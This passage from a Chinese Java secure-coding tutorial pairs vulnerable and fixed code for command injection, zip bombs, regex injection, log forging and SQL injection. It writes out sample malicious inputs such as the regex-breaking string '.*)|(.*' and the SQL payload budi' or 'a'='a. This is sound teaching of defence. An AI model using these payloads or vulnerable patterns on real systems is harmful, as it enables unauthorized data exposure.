class="keyword">if</span> (!Pattern.matches(<span class="string">&quot;[0-9A-Za-z@.]+&quot;</span>, order))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;存在非法命令&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> rt.exec(<span class="string">&quot;cmd.exe /C &quot;</span>+order);</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> proc.waitFor();</span><br><span class="line">        <span class="keyword">if</span>(result !=<span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;process error: &quot;</span>+ result);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> (result == <span class="number">0</span>)? proc.getInputStream() : proc.getErrorStream();</span><br><span class="line">        BufferedReader reader=<span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">        StringBuffer  buffer=<span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine())!=<span class="literal">null</span>)&#123;</span><br><span class="line">            buffer.append(line+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(buffer.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3、防范建议：-3"><a href="#3、防范建议：-3" class="headerlink" title="3、防范建议："></a>3、防范建议：</h2><ul><li>白名单</li><li>严格权限限制</li><li>采用命令标号</li></ul><h1 id="压缩炸弹（zip-bomb）"><a href="#压缩炸弹（zip-bomb）" class="headerlink" title="压缩炸弹（zip bomb）"></a>压缩炸弹（zip bomb）</h1><hr><p>（1）合法输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">普通压缩比文件normal.zip</span><br></pre></td></tr></table></figure><p>（2）恶意输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">高压缩比文件evil.zip</span><br></pre></td></tr></table></figure><p><img src="https://image-1313245095.cos.ap-beijing.myqcloud.com/2023/01/25/16745779073226.jpg" alt=""></p><h1 id="2、Java代码分析-3"><a href="#2、Java代码分析-3" class="headerlink" title="2、Java代码分析"></a>2、Java代码分析</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ZipFault</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span>  <span class="type">int</span> <span class="variable">BUFFER</span> <span class="operator">=</span> <span class="number">512</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;正常压缩文件.......&quot;</span>);</span><br><span class="line">        checkzip(<span class="string">&quot;D:\\JavaWorkspace\\TestInput\\src\\cn\\com\\budi\\zip\\normal.zip&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;恶意压缩文件.......&quot;</span>);</span><br><span class="line">        checkzip(<span class="string">&quot;D:\\JavaWorkspace\\TestInput\\src\\cn\\com\\budi\\zip\\evil.zip&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkzip</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">BufferedOutputStream</span> <span class="variable">dest</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fls</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename);</span><br><span class="line">        <span class="type">ZipInputStream</span> <span class="variable">zis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZipInputStream</span>(<span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(fls));</span><br><span class="line">        ZipEntry entry;</span><br><span class="line">        <span class="type">long</span> <span class="variable">begin</span> <span class="operator">=</span> System.currentTimeMillis();   </span><br><span class="line">        <span class="keyword">while</span> ((entry = zis.getNextEntry()) != <span class="literal">null</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Extracting:&quot;</span> + entry+<span class="string">&quot;\t解压后大小：&quot;</span>+entry.getSize());</span><br><span class="line">            <span class="type">int</span> count;</span><br><span class="line">            <span class="type">byte</span> data[] = <span class="keyword">new</span> <span class="title class_">byte</span>[BUFFER];</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;D:/&quot;</span>+entry.getName());</span><br><span class="line">            dest = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(fos, BUFFER);</span><br><span class="line">            <span class="keyword">while</span> ((count = zis.read(data, <span class="number">0</span>, BUFFER))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                dest.write(data,<span class="number">0</span>, count);</span><br><span class="line">            &#125;</span><br><span class="line">            dest.flush();</span><br><span class="line">            dest.close();</span><br><span class="line">        &#125;</span><br><span class="line">        zis.close();</span><br><span class="line">        <span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> System.currentTimeMillis();   </span><br><span class="line">        System.out.println(<span class="string">&quot;解压缩执行耗时:&quot;</span> + (end - begin) + <span class="string">&quot; 豪秒&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">正常压缩文件.......</span><br><span class="line">Extracting:normal.txt   解压后大小：17496386</span><br><span class="line">解压缩执行耗时:382 豪秒</span><br><span class="line">恶意压缩文件.......</span><br><span class="line">Extracting:evil.txt 解压后大小：2000000000</span><br><span class="line">解压缩执行耗时:25911 豪秒</span><br></pre></td></tr></table></figure><p>（2）合规代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ZipFormat</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span>  <span class="type">int</span> <span class="variable">BUFFER</span> <span class="operator">=</span> <span class="number">512</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">TOOBIG</span> <span class="operator">=</span> <span class="number">0x640000</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        checkzip(<span class="string">&quot;D:\\JavaWorkspace\\TestInput\\src\\cn\\com\\budi\\zip\\normal.zip&quot;</span>);</span><br><span class="line">        checkzip(<span class="string">&quot;D:\\JavaWorkspace\\TestInput\\src\\cn\\com\\budi\\zip\\evil.zip&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkzip</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">BufferedOutputStream</span> <span class="variable">dest</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fls</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename);</span><br><span class="line">        <span class="type">ZipInputStream</span> <span class="variable">zis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZipInputStream</span>(<span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(fls));</span><br><span class="line">        ZipEntry entry;</span><br><span class="line">        <span class="type">long</span> <span class="variable">begin</span> <span class="operator">=</span> System.currentTimeMillis();   </span><br><span class="line">        <span class="keyword">while</span> ((entry = zis.getNextEntry()) != <span class="literal">null</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Extracting:&quot;</span> + entry+<span class="string">&quot;\t解压后大小：&quot;</span>+entry.getSize());</span><br><span class="line">            <span class="keyword">if</span> (entry.getSize() &gt; TOOBIG)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;压缩文件过大&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (entry.getSize() == -<span class="number">1</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;文件大小异常&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> count;</span><br><span class="line">            <span class="type">byte</span> data[] = <span class="keyword">new</span> <span class="title class_">byte</span>[BUFFER];</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;D:/&quot;</span>+entry.getName());</span><br><span class="line">            dest = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(fos, BUFFER);</span><br><span class="line">            <span class="keyword">while</span> ((count = zis.read(data, <span class="number">0</span>, BUFFER))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                dest.write(data,<span class="number">0</span>, count);</span><br><span class="line">            &#125;</span><br><span class="line">            dest.flush();</span><br><span class="line">            dest.close();</span><br><span class="line">        &#125;</span><br><span class="line">        zis.close();</span><br><span class="line">        <span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> System.currentTimeMillis();   </span><br><span class="line">        System.out.println(<span class="string">&quot;解压缩执行耗时:&quot;</span> + (end - begin) + <span class="string">&quot; 豪秒&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">正常文件.........</span><br><span class="line">Extracting:normal.txt   解压后大小：<span class="number">17496386</span></span><br><span class="line">解压缩执行耗时:<span class="number">378</span> 豪秒</span><br><span class="line">===================</span><br><span class="line">恶意文件.........</span><br><span class="line">Extracting:evil.txt 解压后大小：<span class="number">2000000000</span></span><br><span class="line">压缩文件过大</span><br><span class="line">解压缩执行耗时:<span class="number">0</span> 豪秒</span><br></pre></td></tr></table></figure><h2 id="3、防范建议：-4"><a href="#3、防范建议：-4" class="headerlink" title="3、防范建议："></a>3、防范建议：</h2><ul><li>解压前检查解压后文件大小</li></ul><h1 id="正则表达式注入"><a href="#正则表达式注入" class="headerlink" title="正则表达式注入"></a>正则表达式注入</h1><hr><h1 id="1、原理：-3"><a href="#1、原理：-3" class="headerlink" title="1、原理："></a>1、原理：</h1><p>（1）合法输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search=error</span><br></pre></td></tr></table></figure><p>拼接后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(.*? +public\\[\\d+\\]+.*error.*)</span><br></pre></td></tr></table></figure><p>（2）恶意输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search=.*)|(.*</span><br></pre></td></tr></table></figure><p>拼接后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(.*? +public\\[\\d+\\]+.*.*)|(.*.*)</span><br></pre></td></tr></table></figure><h2 id="2、Java代码分析-4"><a href="#2、Java代码分析-4" class="headerlink" title="2、Java代码分析"></a>2、Java代码分析</h2><p>（1）非合规代码（未进行安全检查）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RegexFault</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 以行为单位读取文件，常用于读面向行的格式化文件</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">readFileByLines</span><span class="params">(String filename,String search)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filename);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">regex</span> <span class="operator">=</span><span class="string">&quot;(.*? +public\\[\\d+\\] +.*&quot;</span>+search+<span class="string">&quot;.*)&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;正则表达式：&quot;</span>+regex);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            reader = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(file));</span><br><span class="line">            <span class="type">String</span> <span class="variable">tempString</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">line</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">            System.out.println(<span class="string">&quot;查找开始......&quot;</span>);</span><br><span class="line">            <span class="comment">// 一次读入一行，直到读入null为文件结束</span></span><br><span class="line">            <span class="keyword">while</span> ((tempString = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">//System.out.println(&quot;line &quot; + line + &quot;: &quot; + tempString);</span></span><br><span class="line">                <span class="keyword">if</span>(Pattern.matches(regex, tempString))&#123;</span><br><span class="line">                    <span class="comment">// 显示行号</span></span><br><span class="line">                    System.out.println(<span class="string">&quot;line &quot;</span> + line + <span class="string">&quot;: &quot;</span> + tempString);</span><br><span class="line">                &#125;</span><br><span class="line">                line++;</span><br><span class="line">            &#125;</span><br><span class="line">            reader.close();</span><br><span class="line">            System.out.println(<span class="string">&quot;查找结束....&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (reader != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    reader.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e1) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>   <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">//正常输入</span></span><br><span class="line">        readFileByLines(<span class="string">&quot;D:\\JavaWorkspace\\TestInput\\src\\cn\\com\\budi\\regex\\regex.log&quot;</span>,<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        <span class="comment">//恶意输入</span></span><br><span class="line">       readFileByLines(<span class="string">&quot;D:\\JavaWorkspace\\TestInput\\src\\cn\\com\\budi\\regex\\regex.log&quot;</span>,<span class="string">&quot;.*)|(.*&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">正常输入......</span><br><span class="line">正则表达式：(.*? +public\[\d+\] +.*error.*)</span><br><span class="line">line 5: 10:48:08 public[48964] Backup failed with error: 19</span><br><span class="line">============================</span><br><span class="line">恶意输入......</span><br><span class="line">正则表达式：(.*? +public\[\d+\] +.*.*)|(.*.*)</span><br><span class="line">line 1: 10:47:03 private[423] Successful logout name: budi ssn: 111223333</span><br><span class="line">line 2: 10:47:04 public[48964] Failed to resolve network service</span><br><span class="line">line 3: 10:47:04 public[1] (public.message[49367]) Exited with exit code: 255</span><br><span class="line">line 4: 10:47:43 private[423] Successful login name: budisploit ssn: 444556666</span><br><span class="line">line 5: 10:48:08 public[48964] Backup failed with error: 19</span><br></pre></td></tr></table></figure><p>（2）合规代码（进行安全检查）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">public class RegexFormat &#123;</span><br><span class="line">    /**</span><br><span class="line">     * 检测是否存在非法字符</span><br><span class="line">     * @param search</span><br><span class="line">     */</span><br><span class="line">    private static boolean validate(String search)&#123;</span><br><span class="line">        for (int i = 0; i&lt; search.length(); i++)&#123;</span><br><span class="line">            char ch = search.charAt(i);</span><br><span class="line">            if(!(Character.isLetterOrDigit(ch) || ch ==&#x27; &#x27; || ch ==&#x27;\&#x27;&#x27;))&#123;</span><br><span class="line">                System.out.println(&quot;存在非法字符，查找失败....&quot;);</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * 以行为单位读取文件，常用于读面向行的格式化文件</span><br><span class="line">     */</span><br><span class="line">    public static void readFileByLines(String filename,String search) &#123;</span><br><span class="line">        if(!validate(search))&#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        File file = new File(filename);</span><br><span class="line">        BufferedReader reader = null;</span><br><span class="line">        String regex =&quot;(.*? +public\\[\\d+\\] +.*&quot;+search+&quot;.*)&quot;;</span><br><span class="line">        System.out.println(&quot;正则表达式：&quot;+regex);</span><br><span class="line">        try &#123;</span><br><span class="line">            reader = new BufferedReader(new FileReader(file));</span><br><span class="line">            String tempString = null;</span><br><span class="line">            int line = 1;</span><br><span class="line">            System.out.println(&quot;查找开始......&quot;);</span><br><span class="line">            // 一次读入一行，直到读入null为文件结束</span><br><span class="line">            while ((tempString = reader.readLine()) != null) &#123;</span><br><span class="line">                //System.out.println(&quot;line &quot; + line + &quot;: &quot; + tempString);</span><br><span class="line">                if(Pattern.matches(regex, tempString))&#123;</span><br><span class="line">                    // 显示行号</span><br><span class="line">                    System.out.println(&quot;line &quot; + line + &quot;: &quot; + tempString);</span><br><span class="line">                &#125;</span><br><span class="line">                line++;</span><br><span class="line">            &#125;</span><br><span class="line">            reader.close();</span><br><span class="line">            System.out.println(&quot;查找结束....&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            if (reader != null) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    reader.close();</span><br><span class="line">                &#125; catch (IOException e1) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void   main(String[] args)&#123;</span><br><span class="line">        //正常输入</span><br><span class="line">        System.out.println(&quot;正常输入......&quot;);</span><br><span class="line">        readFileByLines(&quot;D:\\JavaWorkspace\\TestInput\\src\\cn\\com\\budi\\regex\\regex.log&quot;,&quot;error&quot;);</span><br><span class="line">        System.out.println(&quot;============================&quot;);</span><br><span class="line">        //恶意输入</span><br><span class="line">        System.out.println(&quot;恶意输入......&quot;);</span><br><span class="line">       readFileByLines(&quot;D:\\JavaWorkspace\\TestInput\\src\\cn\\com\\budi\\regex\\regex.log&quot;,&quot;.*)|(.*&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">============================</span><br><span class="line">正常输入......</span><br><span class="line">正则表达式：(.*? +public\[\d+\] +.*error.*)</span><br><span class="line">line 5: 10:48:08 public[48964] Backup failed with error: 19</span><br><span class="line">============================</span><br><span class="line">恶意输入......</span><br><span class="line">存在非法字符，查找失败....</span><br></pre></td></tr></table></figure><h2 id="3、防范建议：-5"><a href="#3、防范建议：-5" class="headerlink" title="3、防范建议："></a>3、防范建议：</h2><ul><li>白名单</li></ul><h1 id="0x07-未净化输入"><a href="#0x07-未净化输入" class="headerlink" title="0x07 未净化输入"></a>0x07 未净化输入</h1><hr><p>（1）日志记录</p><p>正常输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">budi</span><br></pre></td></tr></table></figure><p>日志记录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User Login Successed for: budi</span><br></pre></td></tr></table></figure><p>恶意输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">budi \nUser Login Successed for: administrator</span><br></pre></td></tr></table></figure><p>日志记录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User Login Failed for: budi </span><br><span class="line">User Login Successed for: administrator</span><br></pre></td></tr></table></figure><p>（2）更新用户名</p><p>正常输入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>budi</span><br></pre></td></tr></table></figure><p>SQL查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users WHRER id<span class="operator">=</span><span class="string">&#x27;budi&#x27;</span>;</span><br></pre></td></tr></table></figure><p>恶意输入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>budi<span class="string">&#x27; or &#x27;</span>a<span class="string">&#x27;=&#x27;</span>a</span><br></pre></td></tr></table></figure><p>SQL查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users WHRER id<span class="operator">=</span><span class="string">&#x27;budi&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;a&#x27;</span><span class="operator">=</span><span class="string">&#x27;a&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="2、Java代码分析-5"><a href="#2、Java代码分析-5" class="headerlink" title="2、Java代码分析"></a>2、Java代码分析</h2><p>（1）非合规代码（未安全检查）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogFault</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">writeLog</span><span class="params">( <span class="type">boolean</span> isLogin,String username)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(isLogin)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;User Login Successed for: &quot;</span>+username);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;User Login Failed for: &quot;</span>+username);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        String test1= <span class="string">&quot;budi&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;正常用户登录成功后，记录日志.....&quot;</span>);</span><br><span class="line">        <span class="comment">//正常用户登录成功后，记录日志</span></span><br><span class="line">        writeLog(<span class="literal">true</span>, test1);</span><br><span class="line">        <span class="comment">//恶意用户登录失败，记录日志</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">test2</span> <span class="operator">=</span> <span class="string">&quot;budi \nUser Login Successed for: administrator&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;恶意用户登录失败，记录日志.....&quot;</span>);</span><br><span class="line">        writeLog(<span class="literal">false</span>, test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">正常用户登录成功后，记录日志.....</span><br><span 